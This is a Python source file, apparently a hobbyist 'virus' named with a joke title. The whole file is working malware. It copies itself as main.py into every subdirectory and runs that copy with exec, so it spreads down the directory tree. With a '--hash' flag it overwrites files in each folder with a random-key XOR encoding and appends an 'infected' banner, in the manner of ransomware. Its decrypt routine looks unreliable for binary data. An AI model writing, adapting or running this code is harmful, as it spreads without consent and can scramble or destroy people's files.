# the peepee poopoo virus

import os
import hashlib
import sys
import random

def encrypt(text):
    output = ""

    for i in text:
        seed = random.randint(0, 255)
        output += f"{chr(seed)}{chr(i ^ seed)}"
    
    return output

def decrypt(text):
    output = ""

    text = text[:text.find("\nthis file has been infected by the peepee poopoo virus")]

    for i in range(len(text)):
        if i % 2 == 0: # seed
            seed = ord(text[i])
        
        else: # char
            output += chr(ord(text[i]) ^ seed)
        
    return output

hashFiles = False
decryptFiles = False

try:
    if sys.argv[1] == "--hash":
        hashFiles = True
    
    elif sys.argv[1] == "--decrypt":
        decryptFiles = True
except IndexError:
    pass

dirs = [] # list of found directories

# ---------------------------------------------------------------------------------------------

for x in os.listdir(): # for every file in the directory
    if os.path.isdir(x): # if it's actually a folder
        dirs.append(x) # put it in the list of found directories

# ---------------------------------------------------------------------------------------------

# hash each file i guess

if hashFiles:

    for d in dirs:
        os.chdir(d)

        for x in os.listdir():
            if os.path.isfile(x) and x != "main.py":
                with open(x, "rb") as file:
                    c = encrypt(file.read())
                
                with open(x, "w") as file:
                    file.write(f"{c}\nthis file has been infected by the peepee poopoo virus")
        
        os.chdir("..")

if decryptFiles:

    for d in dirs:
        os.chdir(d)

        for x in os.listdir():
            if os.path.isfile(x) and x != "main.py":
                with open(x) as file:
                    c = decrypt(file.read())
                
                with open(x, "w") as file:
                    file.write(c)
    
        os.chdir("..")

# ---------------------------------------------------------------------------------------------

with open("main.py") as s: # open the file
    self_code = s.read() # and set the code

for d in dirs: # for each directory
    with open(f"./{d}/main.py", "w") as codeFile: # make a file named main.py in it
        codeFile.write(self_code) # and write the code

# ---------------------------------------------------------------------------------------------

for d in dirs: # for each directory
    os.chdir(d) # go there

    with open("main.py") as code: # open it
        exec(code.read()) # run it
    
    os.chdir("..") # GO BACK! RUN!
